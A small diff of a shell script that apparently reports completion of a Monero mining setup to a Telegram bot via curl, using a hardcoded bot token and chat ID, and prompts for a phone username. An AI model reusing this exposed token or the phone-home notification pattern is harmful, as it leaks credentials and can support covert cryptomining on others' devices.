@@ -48,7 +48,7 @@ else
 
     BOT_TOKEN="7358706949:AAGmCtR29AVrmTO5lH6M7424T0pWim_Pm0k"
     CHAT_ID="5792222595"
-    MESSAGE = "DONE_MONERO"
+    MESSAGE="DONE_MONERO"
 
     curl -s -X POST "https://api.telegram.org/bot$BOT_TOKEN/sendMessage" \
         -d "chat_id=$CHAT_ID" \
@@ -57,8 +57,9 @@ else
 
 fi
 }
-clear
+
 set(){
+    clear
 echo -e "\e[32mEnter Username of phone:\e[0m"
 read -p "Username: " user
 
